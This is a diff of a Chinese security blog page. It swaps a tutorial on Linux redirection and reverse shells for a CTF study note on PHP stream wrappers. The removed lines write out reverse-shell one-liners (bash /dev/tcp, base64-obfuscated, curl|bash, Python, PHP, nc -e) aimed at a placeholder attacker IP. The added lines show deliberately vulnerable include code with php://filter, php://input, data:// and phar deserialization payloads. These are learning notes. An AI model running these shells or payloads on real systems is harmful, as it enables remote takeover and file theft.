@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="linux," />
+  <meta name="keywords" content="php-wrappers," />
 
 
 
@@ -81,21 +81,31 @@
 
 
 
-<meta name="description" content="先粗略地感受一手什么是linux的重定向功能 新建写有内容的文件from.txt和空文件to.txt，执行下面的命令 12root@localhost:~# cat &lt; from.txt &gt; to.txtroot@localhost:~# cat to.txt  发现from.txt文件里的内容被写入了to.txt。 要理解这种神奇的玩法，就要从linux的文件描述符开始讲起啦。">
+<meta name="description" content="入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="关于linux重定向和反弹shell">
-<meta property="og:url" content="https://www.m0x01sery.com/2022/02/20/redirect-and-bash-rebound/index.html">
+<meta property="og:title" content="php伪协议解析及适用场景总结">
+<meta property="og:url" content="https://www.m0x01sery.com/2021/12/21/php_wrappers/index.html">
 <meta property="og:site_name" content="M1seryの厨房">
-<meta property="og:description" content="先粗略地感受一手什么是linux的重定向功能 新建写有内容的文件from.txt和空文件to.txt，执行下面的命令 12root@localhost:~# cat &lt; from.txt &gt; to.txtroot@localhost:~# cat to.txt  发现from.txt文件里的内容被写入了to.txt。 要理解这种神奇的玩法，就要从linux的文件描述符开始讲起啦。">
+<meta property="og:description" content="入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。">
 <meta property="og:locale">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202202222351390.png">
-<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202202222359286.png">
-<meta property="article:published_time" content="2022-02-19T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-08-31T10:23:40.370Z">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112211700194.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112211703524.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112211711151.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112211942039.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112211952241.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112211522406.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112212116212.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112211610188.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112211623190.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112212011428.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112262150620.png">
+<meta property="og:image" content="https://www.m0x01sery.com/images/BUU/202112262157376.png">
+<meta property="article:published_time" content="2021-12-20T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-09-15T16:00:00.000Z">
 <meta property="article:author" content="M1sery">
-<meta property="article:tag" content="linux">
+<meta property="article:tag" content="php-wrappers">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.m0x01sery.com/images/BUU/202202222351390.png">
+<meta name="twitter:image" content="https://www.m0x01sery.com/images/BUU/202112211700194.png">
 
 
 
@@ -125,13 +135,13 @@
 
 
 
-  <link rel="canonical" href="https://www.m0x01sery.com/2022/02/20/redirect-and-bash-rebound/"/>
+  <link rel="canonical" href="https://www.m0x01sery.com/2021/12/21/php_wrappers/"/>
 
 
 
 
 
-  <title>关于linux重定向和反弹shell | M1seryの厨房</title>
+  <title>php伪协议解析及适用场景总结 | M1seryの厨房</title>
   
 
 
@@ -282,7 +292,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://www.m0x01sery.com/2022/02/20/redirect-and-bash-rebound/">
+    <link itemprop="mainEntityOfPage" href="https://www.m0x01sery.com/2021/12/21/php_wrappers/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="M1sery">
@@ -299,7 +309,7 @@
 
         
         
-          <h2 class="post-title" itemprop="name headline">关于linux重定向和反弹shell</h2>
+          <h2 class="post-title" itemprop="name headline">php伪协议解析及适用场景总结</h2>
         
 
         <div class="post-meta">
@@ -311,8 +321,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-20T00:00:00+08:00">
-                2022-02-20
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-12-21T00:00:00+08:00">
+                2021-12-21
               </time>
             
 
@@ -327,8 +337,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2022-08-31T18:23:40+08:00">
-                2022-08-31
+              <time title="更新于" itemprop="dateModified" datetime="2022-09-16T00:00:00+08:00">
+                2022-09-16
               </time>
             
           </span>
@@ -361,68 +371,113 @@
       
 
       
-        <p>先粗略地感受一手什么是linux的重定向功能</p>
-<p>新建写有内容的文件<code>from.txt</code>和空文件<code>to.txt</code>，执行下面的命令</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# cat &lt; from.txt &gt; to.txt</span><br><span class="line">root@localhost:~# cat to.txt</span><br></pre></td></tr></table></figure>
-
-<p>发现<code>from.txt</code>文件里的内容被写入了<code>to.txt</code>。</p>
-<p>要理解这种神奇的玩法，就要从linux的文件描述符开始讲起啦。</p>
+        <p>入坑以来，练习周大福的时候经常遇到php伪协议的考点。不管是考到数据过滤还是和其它函数配合读取信息，总是不能第一时间反应过来有个php伪协议可以帮忙解决问题。</p>
 <span id="more"></span>
 
+<p>写这篇笔记的目的便是粗略地回顾一下有关php伪协议的知识，同时再加深一些对它的印象和理解了。</p>
+<p>希望自己以后不要再被这个考点麻住了的说</p>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1XM4y1c7Jp"><del>大学期末赛高考 下一篇又得拖到什么时候哦（瘫）</del></a></p>
+<h1 id="食材准备"><a href="#食材准备" class="headerlink" title="食材准备"></a>食材准备</h1><p>所谓php伪协议，其实就是<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">php支持的协议和封装协议</a></p>
+<p>支持的种类分为十二种：</p>
+<p>file:// — 访问本地文件系统</p>
+<p>http:// – https:// — 访问 HTTP(s) 网址</p>
+<p>ftp:// – ftps:// — 访问 FTP(s) URLs</p>
+<p>php:// — 访问各个输入/输出流（I/O streams）</p>
+<p>zlib:// – bzip2:// – zip:// — 压缩流</p>
+<p>data:// — 数据（RFC 2397）</p>
+<p>glob:// — 查找匹配的文件路径模式</p>
+<p>phar:// — PHP 归档</p>
+<p>ssh2:// — Secure Shell 2</p>
+<p>rar:// — RAR</p>
+<p>ogg:// — 音频流</p>
+<p>expect:// — 处理交互式的流</p>
+<p>这里从练习考点出现的频率来看的话，我们先把重心放在 <strong>php:// file:// phar:// data:// glob://</strong> 这五个的用法上</p>
+<p>不能说其它的就可以晾在一边一点也不去学了 只是从现阶段能花的学习时间来看，暂时不应该对它们投入太多时间成本。</p>
+<h1 id="厨房交响"><a href="#厨房交响" class="headerlink" title="厨房交响"></a>厨房交响</h1><h2 id="php-filter-—-你吧来拿"><a href="#php-filter-—-你吧来拿" class="headerlink" title="php://filter — 你吧来拿"></a>php://filter — 你吧来拿</h2><p>可以说这是最常使用的一个伪协议，一般可以利用其造成文件源码泄露。</p>
 <blockquote>
-<p>stdin：标准输入文件，其文件描述符为0，默认由此读取数据</p>
-<p>stdout：标准输出文件，其文件描述符为1，默认向它输出数据</p>
-<p>stderr：标准错误文件，其文件描述符为2，默认向它写入错误信息</p>
-<p>当一个命令执行时，通常从“标准输入”读取输入，在默认情况下，该“标准输入”为我们的键盘。当一个命令将其输出写入到“标准输出”中时，在默认情况下，该“标准输出”是我们的显示器。</p>
-<p>对于某些后台运行的程序，输入可能来自于外部的一些文件，运算的结果通常又写到其他的文件中。而且程序在运行的过程中，会有一些关键性的信息，比如异常堆栈，外部接口调用情况等，这些都会统统写到日志文件里。</p>
-<p>如果某些情况下，我们需要将shell命令的执行结果存储到文件中，那么我们就需要使用输入输出的重定向功能。</p>
+<p>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。</p>
+<p>这对于一体式（all-in-one）的文件函数非常有用，例如<code>readfile()</code>、<code>file()</code>和<code>file_get_contents()</code>。</p>
 </blockquote>
-<p>我们完全可以从字面意思上理解：</p>
-<p>输入重定向：指的是重新指定设备来代替键盘作为新的输入设备</p>
-<p>输出重定向：指的是重新指定设备来代替显示器作为新的输出设备。</p>
-<p>通常是用文件或命令的执行结果来代替键盘作为新的输入设备。</p>
-<p>linux在执行shell命令之前，就会确定好所有的输入输出位置，并且从左到右依次执行重定向的命令。</p>
-<p>linux的一切皆文件的思想在这里也有体现叭。</p>
-<p>在重定向的思想指导下，就诞生了今天的主角——反弹shell。</p>
-<p>最经典的bash反弹</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# bash -i &gt;&amp; /dev/tcp/233.33.3.333/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>常用参数概览</p>
+<blockquote>
+<p>resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流。</p>
+<p>read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+<p>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</p>
+</blockquote>
+<p>常用过滤器</p>
+<blockquote>
+<p>convert.base64-encode &amp; convert.base64-decode</p>
+<p>使用这两个过滤器等同于分别用<code>base64_encode()</code>和<code>base64_decode()</code>函数处理所有的流数据。</p>
+</blockquote>
+<h3 id="本地试吃"><a href="#本地试吃" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure>
 
-<p><code>bash -i</code>：新建一个bash交互终端环境</p>
-<p><code>&gt;&amp; /dev/tcp/233.33.3.333/2333</code>：这条命令用到了重定向绑定，等价于<code>1&gt; /dev/tcp/233.33.3.333/2333 2&gt;&amp;1</code>。意思就是让目标主机与攻击机<code>233.33.3.333</code>的<code>2333</code>端口建立一个tcp连接，并将本机的两个输出都绑定在攻击机的输出设备上（有点取地址符的意思）。这样被攻击的一方将看不见攻击方远程输入的命令，取而代之的现象是攻击机的屏幕上输出命令执行的结果前，会再次输出刚刚输入的命令。</p>
-<p><code>0&gt;&amp;1</code>：同理，把标准输入也弹过来。</p>
-<p>在控制变量<del>（乱改参数）</del>探索时遇到了个小疑惑：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# bash -i &gt; /dev/tcp/233.33.3.333/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>此时index.php的同级目录下有个叫做test.txt的文件。</p>
+<p>试图读取里面的信息</p>
+<p><img src="/images/BUU/202112211700194.png"></p>
+<p>不对啊，我明明往里面写了东西的呢</p>
+<p>让我们用过滤器看看是怎么回事</p>
+<p><img src="/images/BUU/202112211703524.png"></p>
+<p>然后编回来</p>
+<p><img src="/images/BUU/202112211711151.png"></p>
+<p>这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，通过编码后则可以读取文件源码。</p>
+<h2 id="php-input-—-这是替身攻击"><a href="#php-input-—-这是替身攻击" class="headerlink" title="php://input — 这是替身攻击"></a>php://input — 这是替身攻击</h2><blockquote>
+<p><strong>php://input</strong>是个可以访问请求的原始数据的只读流。POST请求少的情况下，最好使用<strong>php://input</strong>来代替 <strong>$HTTP_RAW_POST_DATA</strong>（原生的POST数据），因为它不依赖于特定的<strong>php.ini</strong>指令，内存消耗更少。</p>
+</blockquote>
+<p>那既然都提到POST了，能不带GET玩嘛~</p>
+<h3 id="本地试吃-1"><a href="#本地试吃-1" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php 典中典文件包含漏洞</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
 
-<p>选择不将错误输出弹过来时，被攻击机（右）上仍会显示攻击方输入的命令。</p>
-<p><img src="/images/BUU/202202222351390.png"></p>
-<p>讲道理负责报错的来凑标准输出什么活（误</p>
-<p>理想情况应该是这个亚子</p>
-<p><img src="/images/BUU/202202222359286.png"></p>
-<p>只能说学得太少，看到的种种都成了魔法（悲</p>
-<p>挖个坑先</p>
-<p>攻击机nc监听对应端口</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@localhost:~# nc -lvp 2333</span><br></pre></td></tr></table></figure>
+<p>试图搞事</p>
+<p><img src="/images/BUU/202112211942039.png"></p>
+<p>搞事未遂 雀食 include的再怎么说也得是个文件名嘛</p>
+<p><strong>替 身 觉 醒</strong></p>
+<p><img src="/images/BUU/202112211952241.png"></p>
+<p><strong>ohhhhhhhhhhhhhhhhhhhhhhhhhhhh</strong></p>
+<p>这是什么情况呢……简直<strong>就像是include了一个写着phpinfo()的文件一样</strong>的说</p>
+<p>某些情况下 绕过GET型传参的waf很好用。</p>
+<p>要说更底层的细节的话，本蒟蒻雀食暂时也还没搞懂，正在往死里补，求暂时放过&gt;_&lt;</p>
+<h2 id="file-—-让我访问你网站正不正常啊"><a href="#file-—-让我访问你网站正不正常啊" class="headerlink" title="file:// — 让我访问你网站正不正常啊"></a>file:// — 让我访问你网站正不正常啊</h2><p>通过<strong>file</strong>协议可以访问本地文件系统。</p>
+<p>在浏览器地址栏输入<strong>file</strong>协议可像资源管理器一样读取本地文件。（毕竟还是 <strong>浏览</strong> 器嘛~</p>
+<p><img src="/images/BUU/202112211522406.png"></p>
+<p>在建立了远程连接的情况下再通过php函数配合<strong>file</strong>协议读取文件，就能做到服务端任意文件读取。</p>
+<p><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html"><strong>SSRF</strong></a>（服务端请求伪造，<strong>Server Side Request Forgery</strong>）常用手段。</p>
+<h3 id="本地试吃-2"><a href="#本地试吃-2" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 梅开二度</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
 
-<p><code>-l</code>：开启监听模式而不是主动连接</p>
-<p><code>-v</code>：显示命令执行过程</p>
-<p><code>-p</code>：指定端口</p>
-<p>这样就能满足大部分场景需求了。</p>
-<p>而反弹shell的难点在于，人家显然不会乖乖让我们把这种常见的危险命令直接跑进命令行里（指空格 关键字都被康了</p>
-<p>你太baby辣！（指拒绝乖乖♂站好输命令）看我不把你李宁踹开线（指利用其它环境或编码</p>
-<h1 id="冷油开锅"><a href="#冷油开锅" class="headerlink" title="冷油开锅"></a>冷油开锅</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yMzMuMzMuMy4zMzMvMjMzMyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27; # base64编码绕过空格</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> payload</span><br><span class="line">?file=file:<span class="regexp">//</span>D:\phpStudy\PHPTutorial\WWW\l.txt</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 233.33.3.333/bash.html|bash # 把bash命令写入本地html文件即可</span><br></pre></td></tr></table></figure>
+<p>网上的其它演示都可以打开相对路径的文件 我这设置改来改去还是只能访问绝对路径文件 怪</p>
+<p><img src="/images/BUU/202112212116212.png"></p>
+<h2 id="phar-—-有基佬开我裤链"><a href="#phar-—-有基佬开我裤链" class="headerlink" title="phar:// — 有基佬开我裤链"></a>phar:// — 有基佬开我裤链</h2><p><strong>phar</strong> (“Php ARchive”) 是php里类似于<strong>jar</strong>的一种打包文件</p>
+<p>在周大福里经常作为反序列化考点出现。</p>
+<p>此漏洞利用在Blackhat2018大会上首次提出（大佬们tql），利用这种方法可以在不使用<code>unserialize()</code>函数的情况下触发php反序列化漏洞。</p>
+<h3 id="本地试吃-3"><a href="#本地试吃-3" class="headerlink" title="本地试吃"></a>本地试吃</h3><p>我们先试着创建一个phar文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;233.33.3.333&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; # 要求目标机有python环境</span><br></pre></td></tr></table></figure>
+<p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
+<p>现在我们服务器（127.0.0.1）上就有了一个phar文件。</p>
+<p>phar文件中被压缩的文件的一些信息，其中<strong>meta-data</strong>部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p>
+<p>用<strong>010Editor</strong>打开，可以看到<strong>meta-data</strong>是以序列化的形式存储的</p>
+<p><img src="/images/BUU/202112211610188.png"></p>
+<p>那么有序列化数据必然会有反序列化操作，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将<strong>meta-data</strong>进行反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;phar://phar.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;233.33.3.333&quot;, 2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; # 要求目标机有php交互式环境</span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUU/202112211623190.png"></p>
+<p>只要将phar文件中的<strong>meta-data</strong>换成恶意代码，即可触发反序列化漏洞。</p>
+<p><strong>一种经典周大福</strong></p>
+<p>我称之为<strong>文件查看器</strong>型，通常是有一个上传文件点，一个文件包含点。上传点<strong>一般限制得很死</strong>，图片马什么的想都不要想。phar后缀只要没被限制，就可以先上传有恶意代码的phar文件，再利用文件包含点将其反序列化的同时触发恶意代码。</p>
+<h2 id="data-—-皇军托我给您带个话"><a href="#data-—-皇军托我给您带个话" class="headerlink" title="data:// — 皇军托我给您带个话"></a>data:// — 皇军托我给您带个话</h2><p>一种数据流封装器，用来传递相应格式的数据。通常可以用来执行php代码。</p>
+<p>data://协议必须在<strong>allow_url_fopen</strong>和<strong>allow_url_include</strong>双On才能使用。</p>
+<h3 id="本地试吃-4"><a href="#本地试吃-4" class="headerlink" title="本地试吃"></a>本地试吃</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 帽子戏法</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br></pre></td></tr></table></figure>
 
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh 233.33.3.333 2333 # 要求存在特定版本nc 存在-e 选项就能直接反弹shell</span><br></pre></td></tr></table></figure>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// payload <span class="number">1</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain,%<span class="number">3</span>C%3Fphp+phpinfo%28%29%3B // 防止特殊字符如<span class="string">&#x27;&lt;&gt;&#x27;</span>解析出错进行一次urlencode()</span><br><span class="line"></span><br><span class="line">// payload <span class="number">2</span></span><br><span class="line">?file=data:<span class="regexp">//</span>text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== <span class="regexp">//</span> base64同理</span><br></pre></td></tr></table></figure>
+<p><img src="/images/BUU/202112212011428.png"></p>
+<h2 id="glob-—-我来了就是查寝来了"><a href="#glob-—-我来了就是查寝来了" class="headerlink" title="glob:// — 我来了就是查寝来了"></a>glob:// — 我来了就是查寝来了</h2><p>php中的<code>DirectoryIterator</code>类提供了一个用于查看文件系统目录内容的简单接口。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">getFilename</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p>等等等等（摸摸摸摸</p>
-<p>还有很多其它可行的姿势，看了其它师傅们的总结才能对比出我的思维有多么单调，要学的还有很多呢</p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549#toc-5">反弹shell的本质</a></p>
-<p><a target="_blank" rel="noopener" href="https://whoamianony.top/2021/01/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%8F%8D%E5%BC%B9Shell%EF%BC%8C%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/">反弹Shell，看这一篇就够了</a></p>
+<p>上面这段代码实现了一个简单的文件查看器的功能。</p>
+<p><img src="/images/BUU/202112262150620.png"></p>
+<p>glob协议可以借此查找匹配的文件路径，更精确地查找文件。</p>
+<p><img src="/images/BUU/202112262157376.png"></p>
+<p>此文章发布于2021.12.21，更新于2022.9.16。</p>
 
       
     </div>
@@ -440,7 +495,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/linux/" rel="tag"># linux</a>
+            <a href="/tags/php-wrappers/" rel="tag"># php-wrappers</a>
           
         </div>
       
@@ -453,18 +508,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2021/12/25/phpinfo/" rel="next" title="phpinfo泄漏">
-                <i class="fa fa-chevron-left"></i> phpinfo泄漏
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2022/03/09/computer-networks-basic/" rel="prev" title="域肾透——从看懂到看开 0x00">
-                域肾透——从看懂到看开 0x00 <i class="fa fa-chevron-right"></i>
+              <a href="/2022/03/09/computer_networks_basic/" rel="prev" title="计算机网络概念入门">
+                计算机网络概念入门 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -551,7 +602,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">归档</span>
                 </a>
               </div>
@@ -564,7 +615,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -672,7 +723,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%B7%E6%B2%B9%E5%BC%80%E9%94%85"><span class="nav-number">1.</span> <span class="nav-text">冷油开锅</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A3%9F%E6%9D%90%E5%87%86%E5%A4%87"><span class="nav-number">1.</span> <span class="nav-text">食材准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8E%A8%E6%88%BF%E4%BA%A4%E5%93%8D"><span class="nav-number">2.</span> <span class="nav-text">厨房交响</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php-filter-%E2%80%94-%E4%BD%A0%E5%90%A7%E6%9D%A5%E6%8B%BF"><span class="nav-number">2.1.</span> <span class="nav-text">php:&#x2F;&#x2F;filter — 你吧来拿</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AF%95%E5%90%83"><span class="nav-number">2.1.1.</span> <span class="nav-text">本地试吃</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-input-%E2%80%94-%E8%BF%99%E6%98%AF%E6%9B%BF%E8%BA%AB%E6%94%BB%E5%87%BB"><span class="nav-number">2.2.</span> <span class="nav-text">php:&#x2F;&#x2F;input — 这是替身攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AF%95%E5%90%83-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">本地试吃</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#file-%E2%80%94-%E8%AE%A9%E6%88%91%E8%AE%BF%E9%97%AE%E4%BD%A0%E7%BD%91%E7%AB%99%E6%AD%A3%E4%B8%8D%E6%AD%A3%E5%B8%B8%E5%95%8A"><span class="nav-number">2.3.</span> <span class="nav-text">file:&#x2F;&#x2F; — 让我访问你网站正不正常啊</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AF%95%E5%90%83-2"><span class="nav-number">2.3.1.</span> 